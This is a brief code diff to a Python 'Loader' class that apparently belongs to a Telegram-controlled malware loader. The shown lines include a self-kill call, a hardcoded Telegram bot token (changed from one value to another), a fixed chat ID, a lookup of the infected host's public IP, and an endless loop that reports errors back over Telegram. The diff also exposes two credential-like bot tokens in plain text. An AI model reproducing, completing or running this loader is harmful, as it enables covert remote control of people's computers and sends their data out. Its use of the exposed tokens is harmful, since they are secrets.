@@ -18,7 +18,7 @@ class Loader():
 	def __init__(self):
 		self.Kill_Self()
 		self.progrm = sys.argv[1]
-		self.token = "1761596488:AAG_BdDHTLiX5n40BT5R969inOpRGkYV6fs"
+		self.token = "1906171699:AAECscsJPKALpK0IOXdqq26Q8b5siEix7ig"
 		self.chat_id = "1742761281"
 		data = json.loads(self.Request("http://ip-api.com/json/"))
 		self.ip = data["query"]
@@ -30,7 +30,7 @@ class Loader():
 		while True:
 			try:
 				self.Main()
-			except ConnectionError:
+			except requests.ConnectionError:
 				pass
 			except Exception as ex:
 				self.SendMessage("%E2%9C%96%EF%B8%8F Error : \n %E2%9D%96 Message : " + str(ex))
